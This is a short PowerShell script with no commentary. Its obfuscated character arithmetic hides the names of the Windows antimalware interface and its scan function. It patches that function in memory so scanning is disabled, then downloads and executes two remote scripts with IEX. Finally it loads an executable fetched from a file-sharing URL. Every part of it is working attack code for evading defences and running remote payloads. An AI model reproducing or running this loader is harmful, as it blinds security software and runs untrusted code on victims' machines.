
$hywae = @"
using System;
using System.Runtime.InteropServices;
public class hywae {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr scjvai, uint flNewProtect, out uint lpflOldProtect);
}
"@

Add-Type $hywae

$kzoipfp = [hywae]::LoadLibrary("$([char](97+6-6)+[CHar](109+71-71)+[char](115+17-17)+[CHaR]([bYte]0x69)+[ChaR](46*27/27)+[CHar]([bYTe]0x64)+[ChAR](108+77-77)+[ChaR]([bYtE]0x6c))")
$yuvujx = [hywae]::GetProcAddress($kzoipfp, "$([cHAR]([BYte]0x41)+[ChAR]([BYte]0x6d)+[ChAr]([byTE]0x73)+[CHaR]([ByTE]0x69)+[cHAR](20+63)+[Char](99)+[chAR](97*29/29)+[CHaR]([bYtE]0x6e)+[chaR]([BYTE]0x42)+[CHar]([bYtE]0x75)+[CHar](102*1/1)+[cHAr]([bytE]0x66)+[ChaR](101+46-46)+[CHAr]([bYTE]0x72))")
$p = 0
[hywae]::VirtualProtect($yuvujx, [uint32]5, 0x40, [ref]$p)
$ucwk = "0xB8"
$dylt = "0x57"
$wjxg = "0x00"
$jsfk = "0x07"
$cnme = "0x80"
$bpiq = "0xC3"
$jjszv = [Byte[]] ($ucwk,$dylt,$wjxg,$jsfk,+$cnme,+$bpiq)
[System.Runtime.InteropServices.Marshal]::Copy($jjszv, 0, $yuvujx, 6)


$AllProtocols = [System.Net.SecurityProtocolType]'Ssl3,Tls,Tls11,Tls12'
[System.Net.ServicePointManager]::SecurityProtocol = $AllProtocols

IEX([Net.Webclient]::new().DownloadString("https://raw.githubusercontent.com/F4l13n5n0w/PowerSharpLoader/master/amsi3.txt"));
IEX([Net.Webclient]::new().DownloadString("https://raw.githubusercontent.com/F4l13n5n0w/PowerSharpLoader/master/Invoke-LoadAssembly.ps1"));

Invoke-LoadAssembly -AssemblyUrl https://transfer.sh/l2U4a2/sn0w.exe -Command ""

